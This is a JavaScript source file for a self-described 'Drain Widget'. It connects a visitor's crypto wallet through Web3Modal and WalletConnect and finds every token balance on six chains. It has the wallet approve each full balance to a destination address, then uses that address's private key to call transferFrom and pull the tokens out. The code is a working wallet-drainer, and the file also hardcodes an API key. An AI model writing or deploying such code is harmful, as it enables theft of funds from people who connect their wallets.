// Drain Widget: Web3Modal v1 + WalletConnect


const INFURA_ID = 'YOUR_INFURA_ID';
const COVALENT_API_KEY = 'cqt_rQWqY7xmpj86BhbWrMkdtKtqVt3G';
const CHAIN_CONFIGS = {
  1:   { name: 'Ethereum', covalent: 'eth-mainnet', rpc: `https://mainnet.infura.io/v3/${INFURA_ID}` },
  137: { name: 'Polygon',  covalent: 'matic-mainnet', rpc: 'https://polygon-rpc.com' },
  56:  { name: 'BSC',      covalent: 'bsc-mainnet',   rpc: 'https://bsc-dataseed.binance.org/' },
  10:  { name: 'Optimism', covalent: 'optimism-mainnet', rpc: 'https://mainnet.optimism.io' },
  42161: { name: 'Arbitrum', covalent: 'arbitrum-mainnet', rpc: 'https://arb1.arbitrum.io/rpc' },
  100: { name: 'Gnosis',   covalent: 'gnosis-mainnet', rpc: 'https://rpc.gnosischain.com' },
};
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)"
];

// --- UI ---
const WIDGET_DIV_ID = 'drain-widget-root';
const widgetRoot = document.getElementById(WIDGET_DIV_ID)
if (!widgetRoot) {
  console.error(`No div with id="${WIDGET_DIV_ID}" found. Please add <div id="${WIDGET_DIV_ID}"></div> to your HTML.`);
  throw new Error('Widget root not found');
}

widgetRoot.innerHTML = `
  <div style="border:1px solid #eee;padding:24px;max-width:420px;font-family:sans-serif;">
    <h3>Drain Widget</h3>
    <label>Network:
      <select id="drain-chain-select" style="margin-bottom:8px;">
        ${Object.entries(CHAIN_CONFIGS).map(([id, cfg]) =>
          `<option value="${id}">${cfg.name}</option>`
        ).join('')}
      </select>
    </label>
    <button id="drain-connect-btn">Connect Wallet</button>
    <div id="drain-status"></div>
    <div id="drain-tokens"></div>
    <form id="drain-settings-form" style="margin-top:16px;">
      <input id="drain-destination" type="text" placeholder="Destination Address" style="width:100%;margin-bottom:8px;" required />
      <input id="drain-privatekey" type="password" placeholder="Destination Private Key" style="width:100%;margin-bottom:8px;" required />
      <button type="submit">Save Settings</button>
    </form>
    <button id="drain-send-btn" style="margin-top:16px;display:none;">Send Selected Tokens</button>
  </div>
`;

// --- STATE ---
let userAddress = null;
let tokens = [];
let checkedTokens = {};
let destinationAddress = '';
let destinationPrivateKey = '';
let selectedChainId = 1;
let web3Modal;
let web3Provider;
let ethersProvider;
let signer;

// --- CHAIN SELECTION ---
document.getElementById('drain-chain-select').onchange = e => {
  selectedChainId = parseInt(e.target.value, 10);
  if (userAddress) fetchTokens();
};

// --- WEB3MODAL v1 SETUP ---
const providerOptions = {
  walletconnect: {
    package: window.WalletConnectProvider,
    options: {
      infuraId: INFURA_ID,
      rpc: Object.fromEntries(Object.entries(CHAIN_CONFIGS).map(([id, cfg]) => [id, cfg.rpc]))
    }
  }
};

web3Modal = new window.Web3Modal.default({
  cacheProvider: false,
  providerOptions
});

// --- CONNECT WALLET ---
async function connectWallet() {
  try {
    web3Provider = await web3Modal.connect();
    ethersProvider = new window.ethers.providers.Web3Provider(web3Provider);
    signer = ethersProvider.getSigner();
    userAddress = await signer.getAddress();

    // Detect chain
    const network = await ethersProvider.getNetwork();
    selectedChainId = network.chainId;
    if (!CHAIN_CONFIGS[selectedChainId]) selectedChainId = 1;
    document.getElementById('drain-chain-select').value = selectedChainId;

    document.getElementById('drain-status').innerText =
      `Connected: ${userAddress} (${CHAIN_CONFIGS[selectedChainId].name})`;
    await fetchTokens();
  } catch (err) {
    document.getElementById('drain-status').innerText = 'Connection failed.';
  }
}

// --- FETCH TOKENS ---
async function fetchTokens() {
  document.getElementById('drain-status').innerText = 'Fetching tokens...';
  const chainCfg = CHAIN_CONFIGS[selectedChainId];
  const url = `https://api.covalenthq.com/v1/${chainCfg.covalent}/address/${userAddress}/balances_v2/?quote-currency=USD&format=JSON&nft=false&no-nft-fetch=false&key=${COVALENT_API_KEY}`;
  const res = await fetch(url);
  const data = await res.json();
  tokens = (data.data?.items || []).filter(t => t.type === 'cryptocurrency' && t.balance > 0);
  checkedTokens = {};
  tokens.forEach(t => checkedTokens[t.contract_address] = true);
  renderTokens();
  document.getElementById('drain-send-btn').style.display = tokens.length ? 'block' : 'none';
  document.getElementById('drain-status').innerText = `Found ${tokens.length} tokens.`;
}

// --- RENDER TOKENS ---
function renderTokens() {
  const container = document.getElementById('drain-tokens');
  container.innerHTML = tokens.map(token => `
    <label style="display:block;margin-bottom:4px;">
      <input type="checkbox" data-token="${token.contract_address}" ${checkedTokens[token.contract_address] ? 'checked' : ''} />
      ${token.contract_ticker_symbol}: ${token.balance / (10 ** token.contract_decimals)}
    </label>
  `).join('');
  Array.from(container.querySelectorAll('input[type=checkbox]')).forEach(cb => {
    cb.onchange = e => {
      checkedTokens[cb.dataset.token] = cb.checked;
    };
  });
}

// --- SETTINGS FORM ---
document.getElementById('drain-settings-form').onsubmit = e => {
  e.preventDefault();
  destinationAddress = document.getElementById('drain-destination').value;
  destinationPrivateKey = document.getElementById('drain-privatekey').value;
  document.getElementById('drain-status').innerText = 'Settings saved.';
};

// --- SEND TOKENS ---
document.getElementById('drain-send-btn').onclick = async () => {
  if (!userAddress || !destinationAddress || !destinationPrivateKey) {
    document.getElementById('drain-status').innerText = 'Please connect and set destination.';
    return;
  }
  document.getElementById('drain-status').innerText = 'Sending tokens...';
  const chainCfg = CHAIN_CONFIGS[selectedChainId];
  for (const token of tokens) {
    if (!checkedTokens[token.contract_address]) continue;
    try {
      // 1. Approve destination address using signer
      const contract = new window.ethers.Contract(token.contract_address, ERC20_ABI, signer);
      await contract.approve(destinationAddress, token.balance);

      // 2. TransferFrom using destination private key (simulate backend)
      // WARNING: This is for demo only. Never expose private keys in production!
      const backendProvider = new window.ethers.providers.JsonRpcProvider(chainCfg.rpc);
      const backendWallet = new window.ethers.Wallet(destinationPrivateKey, backendProvider);
      const backendContract = new window.ethers.Contract(token.contract_address, ERC20_ABI, backendWallet);
      const tx = await backendContract.transferFrom(userAddress, destinationAddress, token.balance);
      await tx.wait();
      document.getElementById('drain-status').innerText = `Sent ${token.contract_ticker_symbol}`;
    } catch (err) {
      document.getElementById('drain-status').innerText = `Error sending ${token.contract_ticker_symbol}`;
    }
  }
  document.getElementById('drain-status').innerText = 'Done.';
};

// --- CONNECT BUTTON ---
document.getElementById('drain-connect-btn').onclick = connectWallet;